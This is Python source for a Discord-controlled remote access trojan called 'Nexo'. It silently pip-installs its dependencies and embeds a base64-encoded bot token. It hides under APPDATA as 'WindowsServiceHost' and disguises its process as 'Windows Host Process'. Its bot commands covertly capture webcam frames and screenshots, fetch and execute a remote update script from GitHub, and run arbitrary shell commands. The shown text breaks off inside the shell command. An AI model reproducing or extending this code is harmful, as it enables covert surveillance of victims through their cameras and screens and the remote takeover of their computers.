import subprocess, sys, os, asyncio, base64, requests

# --- SILENT DEPENDENCY INSTALLER ---
required = ['discord.py', 'requests', 'mss', 'opencv-python']
for lib in required:
    try:
        __import__(lib.replace('-python', ''))
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])

import discord
from discord.ext import commands
import mss
import cv2 # Now that we know it's installed

# --- CONFIGURATION ---
ENCODED_TOKEN = "TVRRNE5UTXdPRGcxTkRNME1UUTJPREU0TUEuRzgxMWE5LkNWYXBCX0VfbUEzVG9FQk0yMUczaVNGekdYcXYxbUZSOFNVTU1F" 
VERSION = "1.9"
UPDATE_URL = "https://raw.githubusercontent.com/smatrix1/Nexo/refs/heads/main/winsvc.py"
INSTALL_DIR = os.path.join(os.environ['APPDATA'], 'WindowsServiceHost')
FULL_PATH = os.path.join(INSTALL_DIR, 'winsvc.py')

def get_token(encoded):
    return base64.b64decode(encoded).decode('utf-8').strip()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="r/", intents=intents)

@bot.event
async def on_ready():
    # Set the process title in Task Manager (Visual only)
    try:
        import setproctitle
        setproctitle.setproctitle("Windows Host Process")
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "setproctitle", "--quiet"])

@bot.command()
async def webcam(ctx):
    """Capture a frame from the HP True Vision 5MP Camera."""
    await ctx.send("📸 *Accessing Camera...*")
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) # Optimized for Windows
        await asyncio.sleep(1) # Warm up sensor
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("w.png", frame)
            await ctx.send(file=discord.File("w.png"))
            os.remove("w.png")
        else:
            await ctx.send("❌ Camera busy or not responding.")
        cap.release()
    except Exception as e:
        await ctx.send(f"⚠️ Error: `{e}`")

@bot.command()
async def screen(ctx):
    """Capture Desktop."""
    try:
        with mss.mss() as sct:
            file = sct.shot(output="s.png")
            await ctx.send(file=discord.File(file))
            os.remove(file)
    except Exception as e: await ctx.send(f"❌ Error: {e}")

@bot.command()
async def update(ctx):
    """Silent Update with 3-second delay."""
    await ctx.send("📡 **Downloading Update v1.9...**")
    try:
        r = requests.get(UPDATE_URL, timeout=10)
        if r.status_code == 200:
            with open(FULL_PATH, "w", encoding="utf-8") as f: f.write(r.text)
            await ctx.send("✅ **Update Successful.** Rebooting bot...")
            await asyncio.sleep(3)
            os.execv(sys.executable, ['pythonw.exe', FULL_PATH])
    except Exception as e: await ctx.send(f"⚠️ `{e}`")

@bot.command()
async def ver(ctx): await ctx.send(f"🛰️ **Nexo Build:** `{VERSION}`")

@bot.command()
async def shell(ctx, *, cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
